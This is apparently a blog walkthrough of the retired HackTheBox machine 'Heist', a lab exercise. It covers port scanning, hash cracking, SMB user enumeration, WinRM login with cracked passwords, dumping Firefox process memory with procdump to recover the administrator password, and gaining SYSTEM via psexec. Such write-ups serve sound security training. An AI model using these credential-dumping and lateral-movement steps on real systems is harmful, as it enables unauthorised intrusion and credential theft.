---
layout: default
title : muzec - Heist Writeup
---

![image](https://user-images.githubusercontent.com/69868171/124781906-b359bf80-df3b-11eb-8b3f-5ce7a3a02b96.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Wed Jul  7 08:15:43 2021 as: nmap -sC -sV -oA nmap 10.10.10.149
Nmap scan report for 10.10.10.149
Host is up (0.51s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h00m54s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-07T10:17:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  7 08:17:41 2021 -- 1 IP address (1 host up) scanned in 118.25 seconds
```

Another day another HackTheBox machine so we have our Nmap scan result but before going deep let try to scan if we have `winrm port` open.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.149]
└─$ nmap -sV -sC -p 5985 10.10.10.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 13:11 WAT
Nmap scan report for heist.htb (10.10.10.149)
Host is up (0.56s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.52 seconds
```

Seems we have it open now let start our enumeration on SMB first.

![image](https://user-images.githubusercontent.com/69868171/124785621-e94c7300-df3e-11eb-982b-71471f33da18.png)

We have no anonymous access to SMB now let hit HTTP.

![image](https://user-images.githubusercontent.com/69868171/124787841-ba370100-df40-11eb-88a3-aff93f501ff6.png)

Trying some default credentials i got no luck also maybe some SQL injection payloads got nothing but we still have `Login as guest` let try it.

![image](https://user-images.githubusercontent.com/69868171/124788246-1732b700-df41-11eb-8bfe-460bfd4853dc.png)

Issues comment ground seems cool also a user `hazard` attach a file let try and check it out.

![image](https://user-images.githubusercontent.com/69868171/124789516-44cc3000-df42-11eb-8e6a-0a794943322d.png)

We have some hash passwords that belong to `hazard` i think now let try cracking all.

![image](https://user-images.githubusercontent.com/69868171/124790258-ebb0cc00-df42-11eb-8901-9de38166f066.png)

The website i use in cracking it `https://www.ifm.net.nz/cookbooks/passwordcracker.html`

```
0242114B0E143F015F5D1E161713 - $uperP@ssword
02375012182C1A1D751618034F36415408 - Q4)sJu\Y8qz*A3?d
```
One more hash to go i use john the ripper to crack that.

![image](https://user-images.githubusercontent.com/69868171/124790893-772a5d00-df43-11eb-8d82-8e2608bf2f05.png)

```
stealth1agent
```

Now i think we have 3 users and 3 passwords.

USERNAMES;

```
rout3r
hazard
admin
```

PASSWORDS;

```
$uperP@ssword
Q4)sJu\Y8qz*A3?d
stealth1agent
```

Which have try using on the login page form but i got no luck now time to go back to SMB maybe we can have access to the SMB trying different combination with the credentials i was able to list some shares with `hazard:stealth1agent` .

![image](https://user-images.githubusercontent.com/69868171/124792800-40eddd00-df45-11eb-957e-14777631994a.png)

Now let use `lookupsid.py` from `impacket` to enumerate more users.

`lookupsid.py hazard:stealth1agent@heist.htb`

![image](https://user-images.githubusercontent.com/69868171/124793743-35e77c80-df46-11eb-979c-b29d44a5120b.png)

We have more users now but to cut the story short i was able to get in with `chase:Q4)sJu\Y8qz*A3?d` with `winrm` using `evil-winrm ` just the way i was able to get `hazard` password.

`evil-winrm -i heist.htb -u chase -p 'Q4)sJu\Y8qz*A3?d'`

![image](https://user-images.githubusercontent.com/69868171/124794703-32a0c080-df47-11eb-95b5-f5c40051dc50.png)

Going to the user `chase` desktop and we have user.txt now we just need to owned the system now.

### System / Administrator

I spend time enumerating the box so i notice a  `firefox` process running which is strange.

![image](https://user-images.githubusercontent.com/69868171/124795624-21a47f00-df48-11eb-811a-3189e64bf6aa.png)

So i uploaded `procdump.exe` and dumped one of these firefox processes.

```
upload procdump64.exe
./procdump64.exe -accepteula
./procdump64.exe -ma 2528
```

Then I uploaded strings.exe.

```
upload strings64.exe
./strings64.exe -accepteula
```

![image](https://user-images.githubusercontent.com/69868171/124797158-e014d380-df49-11eb-8f3a-ce6a1f351c9f.png)

Now using `strings64.exe` to view the firefox dump file.

`./strings64.exe firefox.exe_210707_175550.dmp` 

![image](https://user-images.githubusercontent.com/69868171/124797517-3e41b680-df4a-11eb-955c-23910da625a7.png)

Searching for password and i got the admin credentials `4dD!5}x/re8]FBuZ` nice time to use `psexec.py` to log in with the admin credentials we found in the firefox dump.

`psexec.py administrator@10.10.10.149`

![image](https://user-images.githubusercontent.com/69868171/124798179-fa02e600-df4a-11eb-980a-2fac56b95d1e.png)

We are in and done let get the last flag.

![image](https://user-images.githubusercontent.com/69868171/124798359-29b1ee00-df4b-11eb-8225-e31ef23bd653.png)

And we are system.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
